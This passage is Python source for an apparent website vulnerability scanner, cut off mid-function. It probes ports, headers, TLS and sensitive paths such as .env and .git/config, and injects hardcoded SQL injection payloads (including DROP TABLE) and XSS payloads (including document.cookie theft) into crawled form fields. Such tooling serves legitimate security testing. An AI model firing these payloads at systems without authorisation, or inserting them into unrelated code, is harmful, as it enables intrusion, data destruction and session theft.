"""
Website Vulnerability Scanner - Core Scanning Engine
Performs 10 security checks against a target URL and returns
structured vulnerability results.
"""

import socket
import ssl
import re
import time
import json
import urllib.parse
from datetime import datetime, timezone
from concurrent.futures import ThreadPoolExecutor, as_completed

import requests
import urllib3

try:
    from bs4 import BeautifulSoup
    _HAS_BS4 = True
except ImportError:
    _HAS_BS4 = False

# Suppress SSL warnings for scanning purposes
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ─── Constants ────────────────────────────────────────────────────────────────

COMMON_PORTS = [21, 22, 23, 25, 53, 80, 110, 143, 443, 445,
                993, 995, 3306, 3389, 5432, 8080, 8443]

SENSITIVE_PATHS = [
    "/admin", "/administrator", "/login", "/wp-admin", "/wp-login.php",
    "/phpmyadmin", "/cpanel", "/.git", "/.git/config", "/.env",
    "/.htaccess", "/backup", "/backup.zip", "/db", "/database",
    "/server-status", "/server-info", "/.svn", "/.DS_Store",
    "/robots.txt", "/sitemap.xml", "/crossdomain.xml",
    "/wp-config.php.bak", "/config.php", "/config.yml",
    "/.well-known/security.txt", "/api", "/api/v1", "/swagger.json",
    "/graphql", "/debug", "/trace", "/elmah.axd", "/info.php",
]

SECURITY_HEADERS = {
    "Strict-Transport-Security": {
        "severity": "high",
        "description": "HTTP Strict Transport Security (HSTS) header is missing",
        "recommendation": "Add 'Strict-Transport-Security: max-age=31536000; includeSubDomains' header"
    },
    "X-Content-Type-Options": {
        "severity": "medium",
        "description": "X-Content-Type-Options header is missing, allowing MIME-type sniffing",
        "recommendation": "Add 'X-Content-Type-Options: nosniff' header"
    },
    "X-Frame-Options": {
        "severity": "medium",
        "description": "X-Frame-Options header is missing, potential clickjacking risk",
        "recommendation": "Add 'X-Frame-Options: DENY' or 'SAMEORIGIN' header"
    },
    "Content-Security-Policy": {
        "severity": "high",
        "description": "Content-Security-Policy header is missing",
        "recommendation": "Implement a Content Security Policy to prevent XSS and data injection attacks"
    },
    "X-XSS-Protection": {
        "severity": "low",
        "description": "X-XSS-Protection header is missing",
        "recommendation": "Add 'X-XSS-Protection: 1; mode=block' header (legacy browsers)"
    },
    "Referrer-Policy": {
        "severity": "low",
        "description": "Referrer-Policy header is missing",
        "recommendation": "Add 'Referrer-Policy: strict-origin-when-cross-origin' header"
    },
    "Permissions-Policy": {
        "severity": "low",
        "description": "Permissions-Policy header is missing",
        "recommendation": "Add Permissions-Policy header to control browser feature access"
    },
}

# ─── SQL Injection: hardcoded payload/pattern sets ────────────────────────────
#
# Organised by detection technique so the engine can report *how* a finding
# was confirmed, not just that it was. Three techniques are implemented:
#   1. Error-based   - payload provokes a DB error message in the response
#   2. Boolean-based - a TRUE and FALSE condition yield different response
#                       bodies/lengths (blind SQLi, no visible error)
#   3. Time-based     - a payload that sleeps the DB yields a measurable
#                       response delay (blind SQLi, no visible difference)

SQL_ERROR_PAYLOADS = [
    "'", "\"", "`",
    "' OR '1'='1", "\" OR \"1\"=\"1", "' OR '1'='1' --", "' OR '1'='1' #",
    "' OR 1=1--", "\" OR 1=1--", "') OR ('1'='1", "')) OR (('1'='1",
    "1; DROP TABLE users--", "'; DROP TABLE users--",
    "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "1' ORDER BY 1--", "1' ORDER BY 10--",
    "' AND 1=CONVERT(int,(SELECT @@version))--",
    "' AND extractvalue(1,concat(0x7e,version()))--",
    "' AND updatexml(1,concat(0x7e,version()),1)--",
    "'||(SELECT 1 FROM DUAL WHERE 1=1)||'",
    "1' AND '1'='1", "1' AND '1'='2",
    "admin'--", "admin' #", "admin'/*",
]

SQL_BOOLEAN_PAYLOADS = {
    # (true_payload, false_payload) pairs; a genuine boolean-blind SQLi
    # produces a materially different response for the two.
    "numeric": ("1 AND 1=1", "1 AND 1=2"),
    "string_single": ("' AND '1'='1", "' AND '1'='2"),
    "string_double": ("\" AND \"1\"=\"1", "\" AND \"1\"=\"2"),
    "comment_single": ("' AND 1=1-- -", "' AND 1=2-- -"),
    "or_based": ("' OR 'a'='a", "' OR 'a'='b"),
}

SQL_TIME_PAYLOADS = [
    # MySQL
    "' AND SLEEP(5)-- -", "\" AND SLEEP(5)-- -", "' OR SLEEP(5)-- -",
    "1' AND SLEEP(5) AND '1'='1",
    # PostgreSQL
    "'; SELECT pg_sleep(5)--", "1' AND (SELECT 1 FROM PG_SLEEP(5))--",
    # MSSQL
    "'; WAITFOR DELAY '0:0:5'--", "1' WAITFOR DELAY '0:0:5'--",
    # Oracle
    "' AND dbms_pipe.receive_message(('a'),5)=1--",
    # SQLite
    "' AND randomblob(500000000)--",
]

# Backwards-compatible flat list (used where callers expect a single list).
SQL_PAYLOADS = SQL_ERROR_PAYLOADS

SQL_ERROR_PATTERNS = [
    # MySQL
    r"SQL syntax.*MySQL", r"Warning.*mysql_", r"MySqlException",
    r"valid MySQL result", r"check the manual that corresponds to your MySQL",
    r"Unknown column '[^']+' in 'field list'", r"MySQL server version for the right syntax",
    r"com\.mysql\.jdbc", r"Zend_Db_(Adapter|Statement)_Mysqli_Exception",
    # PostgreSQL
    r"PostgreSQL.*ERROR", r"WARNING.*pg_", r"valid PostgreSQL result",
    r"Npgsql\.", r"PG::SyntaxError", r"org\.postgresql\.util\.PSQLException",
    # MSSQL
    r"Microsoft SQL Native Client error", r"ODBC SQL Server Driver",
    r"\[SQLServer\]", r"System\.Data\.SqlClient\.SqlException",
    r"Unclosed quotation mark", r"Incorrect syntax near",
    r"SQL Server.*Driver", r"Microsoft OLE DB Provider for SQL Server",
    # Oracle
    r"ORA-\d{5}", r"Oracle error", r"Oracle.*Driver",
    r"quoted string not properly terminated", r"oracle\.jdbc",
    # SQLite
    r"SQLite\/JDBCDriver", r"SQLite\.Exception",
    r"System\.Data\.SQLite\.SQLiteException", r"sqlite3\.OperationalError",
    r"near \"[^\"]+\": syntax error",
    # Generic / ORM
    r"SQL command not properly ended", r"SQLSTATE\[\d+\]",
    r"Syntax error or access violation", r"Unclosed quotation mark after the character string",
    r"Warning.*\Wpg_.*", r"supplied argument is not a valid MySQL",
]

# ─── XSS: hardcoded payload sets by injection context ─────────────────────────
#
# Reflected-XSS detection is strongest when payloads are tailored to *where*
# the input lands (raw HTML body, an HTML attribute, inside a <script> block,
# or a javascript:/event-handler sink). Grouping payloads this way lets the
# scanner report which context is actually exploitable.

XSS_PAYLOADS_HTML_BODY = [
    "<script>alert('xss')</script>",
    "<img src=x onerror=alert('xss')>",
    "<svg onload=alert('xss')>",
    "<body onload=alert('xss')>",
    "<iframe src=javascript:alert('xss')>",
    "<details open ontoggle=alert('xss')>",
    "<video><source onerror=alert('xss')>",
]

XSS_PAYLOADS_ATTRIBUTE = [
    "\" onmouseover=\"alert('xss')",
    "' onmouseover='alert(\"xss\")",
    "\" autofocus onfocus=\"alert('xss')\" x=\"",
    "'><script>alert('xss')</script>",
    "\"><script>alert('xss')</script>",
    "\" style=\"animation-name:x\" onanimationstart=\"alert('xss')",
]

XSS_PAYLOADS_SCRIPT_CONTEXT = [
    "';alert('xss');//",
    "\";alert('xss');//",
    "</script><script>alert('xss')</script>",
    "'-alert('xss')-'",
    "\\';alert(String.fromCharCode(120,115,115));//",
]

XSS_PAYLOADS_URI_SINK = [
    "javascript:alert('xss')",
    "javascript:alert(document.cookie)",
    "data:text/html,<script>alert('xss')</script>",
]

# Backwards-compatible flat list combining every context.
XSS_PAYLOADS = (
    XSS_PAYLOADS_HTML_BODY
    + XSS_PAYLOADS_ATTRIBUTE
    + XSS_PAYLOADS_SCRIPT_CONTEXT
    + XSS_PAYLOADS_URI_SINK
)

# A unique canary appended to every XSS payload so a raw reflection can be
# told apart from the same string appearing elsewhere in the page by chance.
XSS_CANARY_PREFIX = "zzXSSPROBE"

USER_AGENT = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
              "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")

REQUEST_TIMEOUT = 10
TIME_BASED_THRESHOLD = 4.5   # seconds; baseline vs delayed-response comparison
TIME_BASED_BASELINE_MAX = 2.0  # seconds; baseline request must be this fast

# ─── Crawl constants ───────────────────────────────────────────────────────────

MAX_CRAWL_PAGES = 25       # hard cap on pages visited per scan
MAX_CRAWL_DEPTH = 2        # link depth from the starting URL
CRAWL_TIMEOUT = 8
MAX_FORMS_TESTED = 12      # cap on discovered forms actually injection-tested
SKIP_INPUT_TYPES = {"submit", "button", "reset", "image", "file"}

# Per-process cache so check_sqli / check_xss reuse the same crawl+form data
# that check_crawl (or their own fallback crawl) already gathered, instead of
# re-crawling the site for every module.
_CRAWL_CACHE = {}


# ─── Helpers ──────────────────────────────────────────────────────────────────

def _make_result(name, severity, description, details="", recommendation=""):
    """Create a standardised vulnerability result dict."""
    return {
        "name": name,
        "severity": severity,  # critical | high | medium | low | info
        "description": description,
        "details": details,
        "recommendation": recommendation,
    }


def _get_hostname(url):
    """Extract hostname from URL."""
    parsed = urllib.parse.urlparse(url)
    return parsed.hostname


def _base_url(url):
    """Normalise URL to scheme + netloc."""
    parsed = urllib.parse.urlparse(url)
    return f"{parsed.scheme}://{parsed.netloc}"


def _session():
    """Return a requests Session with a realistic User-Agent."""
    s = requests.Session()
    s.headers.update({"User-Agent": USER_AGENT})
    s.verify = False  # allow self-signed certs during scanning
    return s


def _params_from_url(url, fallback_param, fallback_value):
    """Return (parsed, params) for a URL, injecting a test param if none exist."""
    parsed = urllib.parse.urlparse(url)
    params = urllib.parse.parse_qs(parsed.query)
    if not params:
        test_url = url + ("&" if "?" in url else "?") + f"{fallback_param}={fallback_value}"
        parsed = urllib.parse.urlparse(test_url)
        params = urllib.parse.parse_qs(parsed.query)
    return parsed, params


def _build_test_url(parsed, params, param, payload):
    test_params = dict(params)
    test_params[param] = payload
    query = urllib.parse.urlencode(test_params, doseq=True)
    return f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{query}"


# ─── Crawler: directory/link discovery + form extraction ──────────────────────

def _extract_links(html, page_url):
    """Return absolute same-host links found on a page."""
    links = set()
    if _HAS_BS4:
        soup = BeautifulSoup(html, "html.parser")
        for a in soup.find_all("a", href=True):
            links.add(urllib.parse.urljoin(page_url, a["href"]))
    else:
        for href in re.findall(r'href=["\']([^"\'#]+)["\']', html, re.IGNORECASE):
            links.add(urllib.parse.urljoin(page_url, href))
    return links


def _extract_forms(html, page_url):
    """
    Return a list of form dicts:
        {"page": <page url>, "action": <absolute action url>,
         "method": "GET"|"POST", "inputs": [{"name","type","value"}, ...]}
    Only forms with at least one named, testable input are kept.
    """
    forms = []
    if _HAS_BS4:
        soup = BeautifulSoup(html, "html.parser")
        for form in soup.find_all("form"):
            action = urllib.parse.urljoin(page_url, form.get("action") or page_url)
            method = (form.get("method") or "GET").upper()
            inputs = []
            for tag in form.find_all(["input", "textarea", "select"]):
                name = tag.get("name")
                if not name:
                    continue
                if tag.name == "input":
                    itype = (tag.get("type") or "text").lower()
                else:
                    itype = tag.name  # "textarea" / "select"
                inputs.append({"name": name, "type": itype, "value": tag.get("value", "")})
            if inputs:
                forms.append({"page": page_url, "action": action, "method": method, "inputs": inputs})
    else:
        # Regex fallback when bs4 isn't installed - coarser but functional.
        for form_match in re.finditer(r'<form\b([^>]*)>(.*?)</form>', html, re.IGNORECASE | re.DOTALL):
            attrs, body = form_match.group(1), form_match.group(2)
            action_m = re.search(r'action=["\']([^"\']*)["\']', attrs, re.IGNORECASE)
            method_m = re.search(r'method=["\']([^"\']*)["\']', attrs, re.IGNORECASE)
            action = urllib.parse.urljoin(page_url, action_m.group(1) if action_m else page_url)
            method = (method_m.group(1).upper() if method_m else "GET")
            inputs = []
            for inp in re.finditer(r'<input\b([^>]*)>', body, re.IGNORECASE):
                iattrs = inp.group(1)
                name_m = re.search(r'name=["\']([^"\']*)["\']', iattrs, re.IGNORECASE)
                if not name_m:
                    continue
                type_m = re.search(r'type=["\']([^"\']*)["\']', iattrs, re.IGNORECASE)
                value_m = re.search(r'value=["\']([^"\']*)["\']', iattrs, re.IGNORECASE)
                inputs.append({
                    "name": name_m.group(1),
                    "type": (type_m.group(1).lower() if type_m else "text"),
                    "value": (value_m.group(1) if value_m else ""),
                })
            for ta in re.finditer(r'<textarea\b[^>]*name=["\']([^"\']*)["\']', body, re.IGNORECASE):
                inputs.append({"name": ta.group(1), "type": "textarea", "value": ""})
            if inputs:
                forms.append({"page": page_url, "action": action, "method": method, "inputs": inputs})
    return forms


def crawl_site(start_url, callback=None, max_pages=MAX_CRAWL_PAGES, max_depth=MAX_CRAWL_DEPTH):  #T(V,E)=O(V+E)
    base_host = _get_hostname(start_url)
    sess = _session()
    visited = set()
    queue = [(start_url.split("#")[0], 0)]
    pages = []
    forms = []

    while queue and len(visited) < max_pages:
        current_url, depth = queue.pop(0)
        if current_url in visited:
            continue
        visited.add(current_url)
        try:
            resp = sess.get(current_url, timeout=CRAWL_TIMEOUT, allow_redirects=True)
            content_type = resp.headers.get("Content-Type", "")
            if "text/html" not in content_type and content_type != "":
                continue
            html = resp.text
        except requests.RequestException:
            continue

        pages.append(current_url)
        forms.extend(_extract_forms(html, current_url))
    
        if depth < max_depth:
            for link in _extract_links(html, current_url):
                parsed_link = urllib.parse.urlparse(link)
                if parsed_link.scheme not in ("http", "https"):
                    continue
                if parsed_link.hostname != base_host:
                    continue  # stay within the target site
                clean_link = link.split("#")[0]
                if clean_link not in visited:
                    queue.append((clean_link, depth + 1))

    return {"pages": pages, "forms": forms}


def _get_forms_for(url):
    """Memoised form discovery for a given base URL, shared across modules."""
    base = _base_url(url)
    if base not in _CRAWL_CACHE:
        _CRAWL_CACHE[base] = crawl_site(url)
    return _CRAWL_CACHE[base]["forms"][:MAX_FORMS_TESTED]


def _submit_form(sess, form, target_field, payload, timeout=REQUEST_TIMEOUT):
    """Submit a form with every field at its default/dummy value except
    target_field, which carries the test payload."""
    data = {}
    for inp in form["inputs"]:
        if inp["type"] in SKIP_INPUT_TYPES:
            continue
        if inp["name"] == target_field:
            data[inp["name"]] = payload
        else:
            data[inp["name"]] = inp["value"] or "test"
    if form["method"] == "POST":
        return sess.post(form["action"], data=data, timeout=timeout)
    return sess.get(form["action"], params=data, timeout=timeout)


# ─── Scan Modules ─────────────────────────────────────────────────────────────

def check_headers(url, callback=None):
    """1. HTTP Security Header Analysis"""
    results = []
    if callback:
        callback("header_analysis", "running")
    try:
        sess = _session()
        resp = sess.get(url, timeout=REQUEST_TIMEOUT, allow_redirects=True)
        headers = resp.headers

        present = []
        for header, meta in SECURITY_HEADERS.items():
            if header.lower() not in {k.lower() for k in headers}:
                results.append(_make_result(
                    name=f"Missing Header: {header}",
                    severity=meta["severity"],
                    description=meta["description"],
                    details=f"The response does not include the '{header}' header.",
                    recommendation=meta["recommendation"],
                ))
            else:
                present.append(header)

        if present:
            results.append(_make_result(
                name="Security Headers Present",
                severity="info",
                description=f"{len(present)} security headers are correctly set.",
                details=", ".join(present),
            ))
    except requests.RequestException as e:
        results.append(_make_result(
            name="Header Analysis Error",
            severity="info",
            description=f"Could not analyse headers: {e}",
        ))
    if callback:
        callback("header_analysis", "done")
    return results


def check_ssl(url, callback=None):
    """2. SSL / TLS Certificate Check"""
    results = []
    if callback:
        callback("ssl_tls", "running")
    hostname = _get_hostname(url)
    if not hostname:
        return results

    try:
        ctx = ssl.create_default_context()
        with socket.create_connection((hostname, 443), timeout=REQUEST_TIMEOUT) as sock:
            with ctx.wrap_socket(sock, server_hostname=hostname) as ssock:
                cert = ssock.getpeercert()
                protocol = ssock.version()

                not_after = datetime.strptime(cert["notAfter"], "%b %d %H:%M:%S %Y %Z").replace(tzinfo=timezone.utc)
                days_left = (not_after - datetime.now(timezone.utc)).days

                if days_left < 0:
                    results.append(_make_result(
                        name="SSL Certificate Expired",
                        severity="critical",
                        description="The SSL certificate has expired.",
                        details=f"Expired on {cert['notAfter']}",
                        recommendation="Renew the SSL certificate immediately.",
                    ))
                elif days_left < 30:
                    results.append(_make_result(
                        name="SSL Certificate Expiring Soon",
                        severity="high",
                        description=f"SSL certificate expires in {days_left} days.",
                        details=f"Expires on {cert['notAfter']}",
                        recommendation="Renew the SSL certificate before expiry.",
                    ))
                else:
                    results.append(_make_result(
                        name="SSL Certificate Valid",
                        severity="info",
                        description=f"SSL certificate is valid for {days_left} more days.",
                        details=f"Issuer: {dict(cert['issuer'][0]).get('organizationName', 'N/A')}, "
                                f"Expires: {cert['notAfter']}, Protocol: {protocol}",
                    ))

                if protocol in ("TLSv1", "TLSv1.1", "SSLv3", "SSLv2"):
                    results.append(_make_result(
                        name="Weak TLS Protocol",
                        severity="high",
                        description=f"Server supports outdated protocol: {protocol}",
                        details=f"Negotiated protocol: {protocol}",
                        recommendation="Disable TLS 1.0/1.1 and SSLv3. Use TLS 1.2+ only.",
                    ))
    except ssl.SSLCertVerificationError as e:
        results.append(_make_result(
            name="SSL Certificate Verification Failed",
            severity="high",
            description="SSL certificate could not be verified.",
            details=str(e),
            recommendation="Ensure a valid certificate is installed from a trusted CA.",
        ))
    except (socket.timeout, ConnectionRefusedError, OSError):
        results.append(_make_result(
            name="SSL/TLS Not Available",
            severity="info",
            description="Could not establish SSL/TLS connection on port 443.",
            details="The server may not support HTTPS.",
            recommendation="Enable HTTPS with a valid SSL certificate.",
        ))
    if callback:
        callback("ssl_tls", "done")
    return results


def check_ports(url, callback=None):
    """3. Port Scanning"""
    results = []
    if callback:
        callback("port_scan", "running")
    hostname = _get_hostname(url)
    if not hostname:
        return results

    open_ports = []

    def _scan_port(port):
        try:
            with socket.create_connection((hostname, port), timeout=3):
                return port
        except (socket.timeout, ConnectionRefusedError, OSError):
            return None

    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = {executor.submit(_scan_port, p): p for p in COMMON_PORTS}
        for future in as_completed(futures):
            result = future.result()
            if result is not None:
                open_ports.append(result)

    open_ports.sort()

    if open_ports:
        svc_map = {
            21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 53: "DNS",
            80: "HTTP", 110: "POP3", 143: "IMAP", 443: "HTTPS", 445: "SMB",
            993: "IMAPS", 995: "POP3S", 3306: "MySQL", 3389: "RDP",
            5432: "PostgreSQL", 8080: "HTTP-Alt", 8443: "HTTPS-Alt",
        }
        port_details = [f"{p} ({svc_map.get(p, 'Unknown')})" for p in open_ports]

        risky = [p for p in open_ports if p in (21, 23, 445, 3306, 3389, 5432)]
        if risky:
            results.append(_make_result(
                name="Potentially Risky Open Ports",
                severity="high",
                description=f"Found {len(risky)} potentially risky open port(s).",
                details=", ".join(str(p) for p in risky),
                recommendation="Close unnecessary ports or restrict access with a firewall.",
            ))

        results.append(_make_result(
            name="Open Ports Detected",
            severity="info",
            description=f"{len(open_ports)} open port(s) found.",
            details=", ".join(port_details),
        ))
    else:
        results.append(_make_result(
            name="Port Scan Complete",
            severity="info",
            description="No open ports detected from the common port list.",
        ))
    if callback:
        callback("port_scan", "done")
    return results


def check_technology(url, callback=None):
    """4. Technology Detection"""
    results = []
    if callback:
        callback("tech_detection", "running")
    try:
        sess = _session()
        resp = sess.get(url, timeout=REQUEST_TIMEOUT, allow_redirects=True)
        detected = []

        server = resp.headers.get("Server", "")
        if server:
            detected.append(f"Server: {server}")

        powered = resp.headers.get("X-Powered-By", "")
        if powered:
            detected.append(f"X-Powered-By: {powered}")

        body = resp.text.lower()

        tech_sigs = {
            "WordPress": ["wp-content", "wp-includes", "wordpress"],
            "Joomla": ["joomla", "/media/system/js/"],
            "Drupal": ["drupal", "sites/default/files"],
            "Django": ["csrfmiddlewaretoken", "__admin__"],
            "Laravel": ["laravel_session", "laravel"],
            "React": ["react", "_react", "react-root"],
            "Angular": ["ng-version", "ng-app"],
            "Vue.js": ["vue.js", "vue.min.js", "__vue__"],
            "jQuery": ["jquery"],
            "Bootstrap": ["bootstrap"],
            "Next.js": ["__next", "_next/static"],
            "ASP.NET": ["__viewstate", "asp.net"],
            "Express": [],
            "Nginx": [],
            "Apache": [],
        }

        for tech, signatures in tech_sigs.items():
            for sig in signatures:
                if sig in body or sig.lower() in server.lower() or sig.lower() in powered.lower():
                    detected.append(tech)
                    break

        if detected:
            results.append(_make_result(
                name="Technologies Detected",
                severity="info",
                description=f"Identified {len(detected)} technolog{'y' if len(detected) == 1 else 'ies'}.",
                details=", ".join(list(dict.fromkeys(detected))),
            ))

            if server and any(c.isdigit() for c in server):
                results.append(_make_result(
                    name="Server Version Disclosed",
                    severity="medium",
                    description="The server header discloses version information.",
                    details=f"Server: {server}",
                    recommendation="Remove or obfuscate the Server header to reduce information exposure.",
                ))
        else:
            results.append(_make_result(
                name="Technology Detection",
                severity="info",
                description="Could not identify specific technologies.",
            ))
    except requests.RequestException as e:
        results.append(_make_result(
            name="Technology Detection Error",
            severity="info",
            description=f"Could not perform technology detection: {e}",
        ))
    if callback:
        callback("tech_detection", "done")
    return results


def check_directories(url, callback=None):
    """5. Directory / Sensitive File Enumeration"""
    results = []
    if callback:
        callback("dir_enum", "running")
    base = _base_url(url)
    found = []
    sess = _session()

    for path in SENSITIVE_PATHS:
        try:
            resp = sess.get(f"{base}{path}", timeout=5, allow_redirects=False)
            if resp.status_code == 200:
                found.append({"path": path, "status": 200, "size": len(resp.content)})
            elif resp.status_code in (301, 302, 403):
                found.append({"path": path, "status": resp.status_code, "size": 0})
        except requests.RequestException:
            continue

    accessible = [f for f in found if f["status"] == 200]
    restricted = [f for f in found if f["status"] == 403]

    if accessible:
        critical_paths = [f["path"] for f in accessible if any(
            s in f["path"] for s in [".git", ".env", ".htaccess", "backup", "config", "debug"]
        )]
        if critical_paths:
            results.append(_make_result(
                name="Sensitive Files Accessible",
                severity="critical",
                description=f"{len(critical_paths)} sensitive file(s)/path(s) are publicly accessible.",
                details=", ".join(critical_paths),
                recommendation="Restrict access to sensitive files and directories immediately.",
            ))

        results.append(_make_result(
            name="Accessible Paths Found",
            severity="medium" if not critical_paths else "info",
            description=f"{len(accessible)} path(s) returned HTTP 200.",
            details=", ".join(f"{f['path']} ({f['size']} bytes)" for f in accessible),
            recommendation="Review accessible paths and restrict those not intended to be public.",
        ))

    if restricted:
        results.append(_make_result(
            name="Restricted Paths Detected",
            severity="info",
            description=f"{len(restricted)} path(s) returned 403 Forbidden.",
            details=", ".join(f["path"] for f in restricted),
        ))

    if not found:
        results.append(_make_result(
            name="Directory Enumeration",
            severity="info",
            description="No common sensitive paths were found.",
        ))
    if callback:
        callback("dir_enum", "done")
    return results


def check_crawl(url, callback=None):
    """0. Site Crawl & Form Discovery (feeds injection points to SQLi/XSS checks)"""
    results = []
    if callback:
        callback("site_crawl", "running")
    try:
        crawl_data = crawl_site(url)
        _CRAWL_CACHE[_base_url(url)] = crawl_data
        pages, forms = crawl_data["pages"], crawl_data["forms"]

        page_preview = ", ".join(pages[:15]) + (", ..." if len(pages) > 15 else "")
        results.append(_make_result(
            name="Site Crawl Complete",
            severity="info",
            description=f"Crawled {len(pages)} page(s) up to depth {MAX_CRAWL_DEPTH} (max {MAX_CRAWL_PAGES}).",
            details=page_preview,
        ))

        if forms:
            form_lines = [
                f"{f['method']} {f['action']} [{', '.join(i['name'] for i in f['inputs'])}]"
                for f in forms[:MAX_FORMS_TESTED]
            ]
            note = "" if len(forms) <= MAX_FORMS_TESTED else f" (testing first {MAX_FORMS_TESTED})"
            results.append(_make_result(
                name="Forms Discovered",
                severity="info",
                description=f"{len(forms)} form(s) found across crawled pages{note}; each field will be tested for SQLi/XSS.",
                details="; ".join(form_lines),
            ))
        else:
            results.append(_make_result(
                name="No Forms Found",
                severity="info",
                description="No HTML forms were discovered during the crawl.",
            ))
    except Exception as e:
        results.append(_make_result(
            name="Site Crawl Error",
            severity="info",
            description=f"Could not complete site crawl: {e}",
        ))
    if callback:
        callback("site_crawl", "done")
    return results


def check_sqli(url, callback=None):
    """
    6. SQL Injection Detection

    Runs three independent techniques per query parameter:
      - Error-based:   look for DB error signatures in the response body.
      - Boolean-based: compare response length/content for a TRUE vs FALSE
                        condition injected into the same parameter.
      - Time-based:    look for a measurable delay after a payload designed
                        to make the database sleep, versus a fast baseline.
    """
    results = []
    if callback:
        callback("sqli", "running")

    sess = _session()
    parsed, params = _params_from_url(url, "id", "1")
    forms = _get_forms_for(url)

    # Build a uniform list of "injection points" - each one is just something
    # with a label and a get_response(payload) function. This is the same
    # formula whether the payload lands in a URL query parameter or a
    # crawled HTML form field.
    
    
    injection_points = []
    for param in params:
        injection_points.append({
            "label": f"query param '{param}'",
            "get_response": lambda payload, p=param: sess.get(
                _build_test_url(parsed, params, p, payload), timeout=REQUEST_TIMEOUT),
        })
    for form in forms:
        for inp in form["inputs"]:
            if inp["type"] in SKIP_INPUT_TYPES:
                continue
            injection_points.append({
                "label": f"form field '{inp['name']}' ({form['method']} {form['action']})",
                "get_response": lambda payload, f=form, name=inp["name"]: _submit_form(
                    sess, f, name, payload),
            })

    if not injection_points:
        results.append(_make_result(
            name="SQL Injection Test",
            severity="info",
            description="No query parameters or form fields found to test for SQL injection.",
            recommendation="Manually test forms and API endpoints for SQL injection.",
        ))
        if callback:
            callback("sqli", "done")
        return results

    error_findings = []
    boolean_findings = []
    time_findings = []

    for point in injection_points:
        label = point["label"]
        get_response = point["get_response"]
        
        # SQLiError	​={1,0, Response∩ErrorPattern =∅ Otherwise​


        # --- 1. Error-based ---
        for payload in SQL_ERROR_PAYLOADS:
            try:
                resp = get_response(payload)
                body = resp.text
                for pattern in SQL_ERROR_PATTERNS:
                    if re.search(pattern, body, re.IGNORECASE):
                        error_findings.append((label, payload, pattern))
                        break
                else:
                    continue
                break  # stop testing more payloads on this point once confirmed
            except requests.RequestException:
                continue

        # --- 2. Boolean-based blind ---
        for technique, (true_payload, false_payload) in SQL_BOOLEAN_PAYLOADS.items():
            try:
                true_resp = get_response(true_payload)
                false_resp = get_response(false_payload)

                len_true, len_false = len(true_resp.text), len(false_resp.text)
                status_true, status_false = true_resp.status_code, false_resp.status_code

                # Flag only a clear divergence to avoid false positives from
                # naturally dynamic pages (timestamps, counters, etc.)
                if status_true != status_false or (
                    len_true != len_false and
                    abs(len_true - len_false) > max(20, 0.02 * max(len_true, len_false))
                ):
                    boolean_findings.append((label, technique, len_true, len_false))
                    break
            except requests.RequestException:
                continue

        # --- 3. Time-based blind ---
        # Delay=Tpayload​−Tbaseline
        try:
            t0 = time.time()
            get_response("1")
            baseline_elapsed = time.time() - t0
        except requests.RequestException:
            baseline_elapsed = None

        if baseline_elapsed is not None and baseline_elapsed < TIME_BASED_BASELINE_MAX:
            for payload in SQL_TIME_PAYLOADS:
                try:
                    t0 = time.time()
                    get_response(payload)
                    elapsed = time.time() - t0
                    if elapsed - baseline_elapsed >= TIME_BASED_THRESHOLD:
                        time_findings.append((label, payload, round(elapsed, 2)))
                        break
                except requests.RequestException:
                    continue

    if error_findings:
        details = "; ".join(
            f"{lbl} with payload '{pl}' matched pattern /{pat}/" for lbl, pl, pat in error_findings
        )
        results.append(_make_result(
            name="SQL Injection (Error-Based)",
            severity="critical",
            description=f"SQL error patterns detected in {len(error_findings)} test(s).",
            details=details,
            recommendation="Use parameterized queries/prepared statements. Never concatenate user input into SQL. Disable verbose DB error output in production.",
        ))

    if boolean_findings:
        details = "; ".join(
            f"{lbl} via {t} (TRUE len={lt}, FALSE len={lf})" for lbl, t, lt, lf in boolean_findings
        )
        results.append(_make_result(
            name="SQL Injection (Boolean-Based Blind)",
            severity="critical",
            description=f"Response diverges between TRUE/FALSE conditions for {len(boolean_findings)} test(s), indicating blind SQL injection.",
            details=details,
            recommendation="Use parameterized queries/prepared statements and validate/allow-list input types (e.g. cast numeric IDs).",
        ))

    if time_findings:
        details = "; ".join(
            f"{lbl} with payload '{pl}' delayed response by {el}s" for lbl, pl, el in time_findings
        )
        results.append(_make_result(
            name="SQL Injection (Time-Based Blind)",
            severity="critical",
            description=f"Injected sleep/delay payloads measurably slowed the response for {len(time_findings)} test(s), indicating blind SQL injection.",
            details=details,
            recommendation="Use parameterized queries/prepared statements. Apply least-privilege DB accounts and query timeouts as defence in depth.",
        ))

    if not (error_findings or boolean_findings or time_findings):
        results.append(_make_result(
            name="SQL Injection Test",
            severity="info",
            description="No SQL injection vulnerabilities detected via error-based, boolean-based, or time-based testing.",
            recommendation="Consider deeper testing with authenticated sessions and second-order injection points.",
        ))

    if callback:
        callback("sqli", "done")
    return results


def check_xss(url, callback=None):
    """
    7. XSS Detection

    Tests each query parameter with context-specific payloads (raw HTML
    body, HTML attribute, <script> block, and javascript:/URI sinks), and
    for each reflection checks whether the payload came back unescaped
    (exploitable) or HTML-entity-encoded (safely neutralised).
    """
    results = []
    if callback:
        callback("xss", "running")

    sess = _session()
    parsed, params = _params_from_url(url, "q", "test")
    forms = _get_forms_for(url)

    # Same uniform injection-point formula as check_sqli: query params and
    # crawled form fields are tested identically.
    injection_points = []
    for param in params:
        injection_points.append({
            "label": f"query param '{param}'",
            "get_response": lambda payload, p=param: sess.get(
                _build_test_url(parsed, params, p, payload), timeout=REQUEST_TIMEOUT),
        })
    for form in forms:
        for inp in form["inputs"]:
            if inp["type"] in SKIP_INPUT_TYPES:
                continue
            injection_points.append({
                "label": f"form field '{inp['name']}' ({form['method']} {form['action']})",
                "get_response": lambda payload, f=form, name=inp["name"]: _submit_form(
                    sess, f, name, payload),
            })

    if not injection_points:
        results.append(_make_result(
            name="XSS Test",
            severity="info",
            description="No query parameters or form fields found to test for XSS.",
            recommendation="Manually test forms and input fields for XSS vulnerabilities.",
        ))
        if callback:
            callback("xss", "done")
        return results

    context_payload_map = {
        "HTML body": XSS_PAYLOADS_HTML_BODY,
        "HTML attribute": XSS_PAYLOADS_ATTRIBUTE,
